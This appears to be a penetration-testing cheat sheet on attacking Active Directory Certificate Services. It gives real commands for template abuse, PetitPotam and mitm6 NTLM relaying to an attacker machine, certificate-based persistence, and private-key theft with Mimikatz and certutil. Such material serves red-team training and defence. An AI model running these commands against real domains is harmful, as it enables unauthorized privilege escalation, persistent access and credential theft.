---
layout: blank
pagetitle: Attacking Active Directory Certificate Services
---


## What is ADCS

**Overview of ADCS**
- ADCS implements Public Key Infrastructure (PKI) in Windows domains, providing certificates for secure communication, user authentication, and more.
- It integrates tightly with Active Directory, enabling automated certificate issuance and renewal.
- Common uses include:
    - Smart card logon
    - Encrypting File System (EFS)
    - Wi-Fi and VPN authentication

**Key Components**
- Certificate Authority (CA): Issues, revokes, and manages certificates.
- Enrollment Services: Allows users and computers to request certificates via interfaces like the Certificate Enrollment Web Service (CES).
- Certificate Templates: Define certificate properties, validity periods, and permissions.

### Enumeration
The first step in attacking ADCS is understanding the configuration of the CA, its templates, and associated permissions. Enumerating these components reveals potential misconfigurations that can be exploited.

- **Certipy** - Python tool for ADCS enumeration:
```
certipy find -u {username} -p {password} -dc-ip {dc_IP} -text -stdout
```
    - Look for `[!] Vulnerabilities` in templates and certificates
- **ldapsearch** - Query AD objects for ADCS-related information:
```
ldapsearch -x -h {DC_IP} -b "CN=Configuration,DC=domain,DC=com" "(objectClass=pKIEnrollmentService)"
```
- **Certutil** - View available certificate templates:
```
certutil -template
```

### Common Vulnerabilities
ADCS often suffers from misconfigurations or insecure defaults that attackers can exploit. Here are the primary vulnerabilities:

- **Misconfigured Certificate Templates**:
    - Templates allowing _Authenticated Users_ to enroll enable low-privilege users to request certificates for accounts with higher privileges.
    - Certificate request agent rights can be abused to impersonate other users.
- **NTLM Relay Attacks**:
    - ADCS web enrollment services often lack Extended Protection for Authentication (EPA), making them vulnerable to NTLM relaying.
- **Vulnerable DACLs**:
    - Improper permissions on CA objects can allow attackers to modify or issue unauthorized certificates.
Insecure configurations allow attackers to escalate privileges by obtaining certificates for sensitive accounts or performing man-in-the-middle attacks.

### Attack Techniques

**Exploitation of Misconfigured Certificate Templates**
Certificate templates define which users can request specific types of certificates. When a template is misconfigured to allow enrollment by "Authenticated Users," any domain user can request a certificate that provides elevated privileges. This is a common misstep in ADCS deployments.

- Find templates and identify misconfigurations:
```
certipy find -u {username} -p {password} -d {domain}
```
- Request a certificate from a vulnerable template:
```
certipy request -u {username} -p {password} -d {domain} -template {template_name}
```
- Authenticate using the obtained certificate:
```
Rubeus.exe asktgt /user:{username} /certificate:{path_to_cert} /password:{password}
```

**NTLM Relay with PetitPotam**
The PetitPotam attack coerces a target server to authenticate to an attacker-controlled machine via NTLM. When relayed to the ADCS web enrollment service, this can be used to request certificates that allow domain escalation.
- Trigger authentication via PetitPotam:
```
PetitPotam.py {target_DC_IP} {attacker_IP}
```
- Relay NTLM to ADCS:
```
ntlmrelayx.py -t http://{ADCS_IP}/certsrv/certfnsh.asp
```
- Extract and use the resulting certificate to impersonate privileged users.

**Machine-in-the-Middle with mitm6**
ADCS systems are often vulnerable to IPv6 spoofing attacks. Tools like mitm6 allow attackers to intercept NTLM traffic, relaying it to request certificates for privilege escalation.
- Launch IPv6 spoofing:
```
mitm6 -d {domain}
```
- Relay NTLM to ADCS:
```
ntlmrelayx.py -6 -t ldap://{DC_IP} --adcs
```

**Persistence with Certificates**

Certificates are an excellent mechanism for persistence because they allow authentication without passwords. By requesting a long-lived certificate, attackers can maintain access even if the compromised user’s password is changed.

- Request a certificate with extended validity:
```
certipy request -u {username} -p {password} -d {domain} -template {template_name} -validity {days}
```
- Export the certificate for reuse:
```
certutil -exportPFX -p {password} -cert {cert_name} {output_path}
```
- Authenticate using the certificate:
```
Rubeus.exe asktgt /user:{username} /certificate:{path_to_cert}
```

**Certificate Theft**
Attackers can extract private keys and certificates from systems to impersonate users or maintain persistence.
- Dump private keys using Mimikatz:
```
crypto::capi
```
- Export certificates with private keys:
```
certutil -exportPFX -user -p {password} my {output_file}
```

Stolen certificates can be used in attacks such as pass-the-certificate to impersonate users or maintain access to systems.